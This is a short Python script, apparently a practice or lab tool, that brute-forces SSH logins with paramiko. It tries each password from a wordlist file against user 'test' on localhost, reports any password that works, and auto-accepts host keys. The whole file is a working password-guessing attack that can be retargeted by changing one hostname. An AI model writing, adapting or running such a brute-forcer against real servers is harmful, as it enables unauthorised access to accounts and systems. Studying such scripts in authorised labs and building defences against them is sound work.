import paramiko

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
fid = open('passwords.txt', 'rb')

def trying(password):
    try:
        client.connect('localhost', username='test', password=password, timeout=0.05)
        print(f"[+] Password found: {password}")
        return True
    except:
        print(f"[-] trying {password}")
        return False
    
for i in fid.readlines():
    password = i.strip().decode('utf-8')
    if trying(password):
        break
    